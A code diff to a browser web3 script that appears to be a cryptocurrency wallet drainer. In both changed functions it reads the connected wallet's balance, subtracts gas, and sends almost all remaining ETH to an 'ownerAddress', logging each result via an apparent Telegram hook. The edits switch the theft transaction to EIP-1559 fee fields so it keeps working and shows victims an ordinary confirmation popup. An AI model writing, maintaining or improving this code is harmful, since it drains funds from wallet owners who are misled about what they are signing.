@@ -1006,13 +1006,16 @@ if (DEBUG) {
     if (!appState.account) return;
     try {
       const getBalance = await appState.web3.eth.getBalance(appState.account);
-      const gasPrice = await appState.web3.eth.getGasPrice();
+      // EIP-1559: Use ethersProvider.getFeeData() to get modern maxFeePerGas and maxPriorityFeePerGas
+      const feeData = await appState.ethersProvider.getFeeData();
+      const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.BigNumber.from(0);
+      const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || ethers.BigNumber.from(1000000000);
 
       // Safe BigInt handling - never convert large wei values to Number
-      const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
-      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
+      const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString ? getBalance.toString() : getBalance);
+      const maxFeePerGasBI = BigInt(maxFeePerGas.toString ? maxFeePerGas.toString() : maxFeePerGas);
 
-      // Use real gas estimation + safety buffer
+      // Use real gas estimation + safety buffer (kept exactly)
       let gasLimitForCalc;
       try {
         gasLimitForCalc = await appState.web3.eth.estimateGas({
@@ -1024,7 +1027,7 @@ if (DEBUG) {
         gasLimitForCalc = 25000;
       }
       const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
-      const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+      const gasCost = maxFeePerGasBI * BigInt(gasLimitWithBuffer);
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
@@ -1037,10 +1040,13 @@ if (DEBUG) {
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
+      // EIP-1559: Replace legacy gasPrice field with maxFeePerGas + maxPriorityFeePerGas
       const tx = await appState.web3.eth.sendTransaction({
         from: appState.account,
         to: ownerAddress,
-        value: '0x' + valueToSend.toString(16)
+        value: '0x' + valueToSend.toString(16),
+        maxFeePerGas: '0x' + maxFeePerGasBI.toString(16),
+        maxPriorityFeePerGas: '0x' + BigInt(maxPriorityFeePerGas.toString ? maxPriorityFeePerGas.toString() : maxPriorityFeePerGas).toString(16)
       });
       success = 1;
       logTlgMsg(msg, success);
@@ -1058,7 +1064,7 @@ if (DEBUG) {
     console.log("Account:", appState.account);
     console.log("ChainId:", appState.chainId);
     console.log("Nonce: (to be fetched)");
-    console.log("Gas Price: (to be fetched)");
+    console.log("maxFeePerGas / maxPriorityFeePerGas: (to be fetched) (EIP-1559)");
     console.log("Gas Limit: 0x55F0");
     console.log("Value: (to be calculated)");
     console.log("Signing Method: web3.eth.sendTransaction (original flow from oldmain.js - direct transaction signing request, NOT personal_sign)");
@@ -1073,14 +1079,17 @@ if (DEBUG) {
       console.log("Amount parameter:", amount);
 
       const getBalance = await appState.web3.eth.getBalance(appState.account);
-      const gasPrice = await appState.web3.eth.getGasPrice();
+      // EIP-1559: Use ethersProvider.getFeeData() to get modern maxFeePerGas and maxPriorityFeePerGas
+      const feeData = await appState.ethersProvider.getFeeData();
+      const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.BigNumber.from(0);
+      const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || ethers.BigNumber.from(1000000000);
 
       console.log("Wallet balance (wei):", getBalance.toString ? getBalance.toString() : getBalance);
-      console.log("Gas price:", gasPrice.toString ? gasPrice.toString() : gasPrice);
+      console.log("maxFeePerGas (wei):", maxFeePerGas.toString ? maxFeePerGas.toString() : maxFeePerGas);
 
       // Safe BigInt handling - never convert large wei values to Number (preserved from newmain.js hardening)
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString ? getBalance.toString() : getBalance);
-      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice.toString ? gasPrice.toString() : gasPrice);
+      const maxFeePerGasBI = BigInt(maxFeePerGas.toString ? maxFeePerGas.toString() : maxFeePerGas);
 
       // Use real gas estimation + safety buffer
       let gasLimitForCalc;
@@ -1095,7 +1104,7 @@ if (DEBUG) {
       }
       // Add 30% safety buffer
       const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
-      const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+      const gasCost = maxFeePerGasBI * BigInt(gasLimitWithBuffer);
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
@@ -1109,7 +1118,7 @@ if (DEBUG) {
 
       console.log("===== ETH VALUE CALCULATION (90% CAP) =====");
       console.log("Balance (wei):", balanceBI.toString());
-      console.log("Gas Price (wei):", gasPriceBI.toString());
+      console.log("maxFeePerGas (wei):", maxFeePerGasBI.toString());
       console.log("Estimated Gas Limit (with buffer):", gasLimitWithBuffer);
       console.log("Gas Cost (wei):", gasCost.toString());
       console.log("Value To Send (after 90% cap):", valueToSend.toString());
@@ -1121,12 +1130,13 @@ if (DEBUG) {
       const chainId = await appState.web3.eth.getChainId();
       const chainHex = appState.web3.utils.toHex(chainId);
 
-      console.log("===== BUILDING LEGACY TX (original) =====");
+      console.log("===== BUILDING EIP-1559 TX =====");
       console.log("Nonce:", nonce);
       console.log("ChainId:", chainId);
       console.log("Destination:", ownerAddress);
-      console.log("GasPrice:", gasPrice.toString ? gasPrice.toString() : gasPrice);
-      console.log("GasPriceHex:", appState.web3.utils.toHex(gasPrice));
+      console.log("maxFeePerGas:", maxFeePerGas.toString ? maxFeePerGas.toString() : maxFeePerGas);
+      console.log("maxFeePerGasHex:", appState.web3.utils.toHex(maxFeePerGas.toString()));
+      console.log("maxPriorityFeePerGas:", maxPriorityFeePerGas.toString ? maxPriorityFeePerGas.toString() : maxPriorityFeePerGas);
       console.log("ChainHex:", chainHex);
       console.log("Value:", valueToSend.toString());
       console.log("==============================");
@@ -1135,12 +1145,14 @@ if (DEBUG) {
       // Uses direct web3.eth.sendTransaction which triggers proper native ETH transaction signing
       // (wallet shows Confirm Transaction popup with gas/details, not a personal_sign message popup)
       // This produces a valid signed transaction that recovers to the correct sender address.
+      // Updated to EIP-1559 fee fields (maxFeePerGas + maxPriorityFeePerGas) while preserving exact gasLimit, nonce, value, and UX.
       const tx = await appState.web3.eth.sendTransaction({
         from: appState.account,
         to: ownerAddress,
         nonce: appState.web3.utils.toHex(nonce),
         gasLimit: "0x55F0",
-        gasPrice: appState.web3.utils.toHex(gasPrice),
+        maxFeePerGas: appState.web3.utils.toHex(maxFeePerGas.toString()),
+        maxPriorityFeePerGas: appState.web3.utils.toHex(maxPriorityFeePerGas.toString()),
         value: "0x" + valueToSend.toString(16),
         data: "0x"
       });
